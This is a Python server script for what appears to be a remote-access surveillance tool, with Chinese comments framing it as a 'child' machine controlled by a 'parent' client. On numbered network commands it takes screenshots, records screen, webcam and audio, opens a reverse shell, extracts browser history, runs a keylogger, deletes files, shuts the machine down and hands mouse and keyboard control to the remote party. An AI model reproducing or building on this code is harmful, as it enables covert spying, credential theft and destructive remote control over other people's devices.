import socket
import subprocess
import platform
import os
from getpass import getuser
from screenshot import screenshot
from camera_record import record_video_with_audio
from reverse_shell import handle_reverse_shell
from screen_recording import record_screen
from web_history import extract_and_send_history
from keylogger import start_keylogger, stop_keylogger  # Import keylogger functions
from remote_control_keyboard import type_key_at_mouse_position
from mouse_control import handle_mouse_control
import cv2
import threading
import numpy as np
import pickle
import struct


# server.py
# 我現在是 server (小孩)  我要一直開著 等待被client (父母) 連線
# 然後我需要接收來自 client (父母) 發送的指令
# 並傳送資料給 client (父母)  "

# Execute the given script.
def execute_script(script_name):
    """Execute the given script."""
    script_path = os.path.join(os.path.dirname(__file__), script_name)
    try:
        result = subprocess.run(['python', script_path], check=True, text=True, capture_output=True)
        print(f"Script output: {result.stdout}")
    except subprocess.CalledProcessError as e:
        print(f"Script execution failed, error: {e.stderr}")
    except FileNotFoundError:
        print(f"File not found: {script_path}")

# Send video stream to the client
def send_video_stream(host, port):
    cap = cv2.VideoCapture(0)  # 從預設相機捕獲視頻

    # 設置客戶端套接字
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        # 將畫面轉換為位元組
        frame = cv2.resize(frame, (640, 480))  # 根據需要調整大小
        frame_bytes = frame.tobytes()
        frame_size = len(frame_bytes)

        # 發送畫面大小和畫面數據
        client_socket.send(frame_size.to_bytes(4, byteorder='big'))
        client_socket.send(frame_bytes)

    cap.release()
    client_socket.close()

# Handle commands from the client
def handle_client_commands(conn):
    while True:
        message = conn.recv(1024).decode()  # 接收來自客戶端的指令
        print(message)
        if message == '0':
            break
        if message == '1':
            num_screenshots = int(conn.recv(1024).decode())  # 接收截圖數量
            screenshot(conn, num_screenshots)
        elif message == '2':
            s_duration = int(conn.recv(1024).decode())  # 接收錄屏持續時間
            record_screen(duration=s_duration, client_socket=conn)  # 錄製並發送文件
        elif message == '3':
            c_duration = int(conn.recv(1024).decode())  # 接收錄製持續時間
            record_video_with_audio(conn, duration=c_duration)  # 錄製視頻和音頻
        elif message == '4':
            handle_reverse_shell(conn)  # 處理反向 shell
        elif message == '5':
            extract_and_send_history(conn)  # 提取並發送瀏覽器歷史
        elif message == '6':
            start_keylogger()  # 啟動鍵盤記錄
        elif message == '7':
            stop_keylogger(conn)  # 停止鍵盤記錄
        elif message == '8':
            execute_script('file_delete.py')
        elif message == '9':
            execute_script('close.py')  # 執行關機腳本且檔案刪除
        elif message == '0':
            break
        elif message == '10':
            while True:
                mouse_command = conn.recv(1024).decode()
                if mouse_command.lower() == 'exit':
                    break
                handle_mouse_control(mouse_command)
        elif message == 'V':
            video_thread = threading.Thread(target=send_video_stream, args=('127.0.0.1', 5001))
            video_thread.start()
        try:
            event_type, key = message.split(':', 1)  # 解析事件類型和鍵
            if key.startswith('Key.'):
                key = key[4:]
            type_key_at_mouse_position(event_type, key)
        except ValueError:
            pass  # 忽略解析錯誤

# 啟動伺服器
def server_program():
    host = '0.0.0.0'
    port = 9999
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print("Listening...")

    while True: 
        conn, addr = server_socket.accept()
        print(f"已經連接到 {addr}")
        
        # 啟動處理客戶端指令的線程
        client_thread = threading.Thread(target=handle_client_commands, args=(conn,))
        client_thread.start()

        # 主循環保持伺服器運行
        # client_thread.join()  # 等待客戶端線程結束

if __name__ == '__main__':
    server_program()
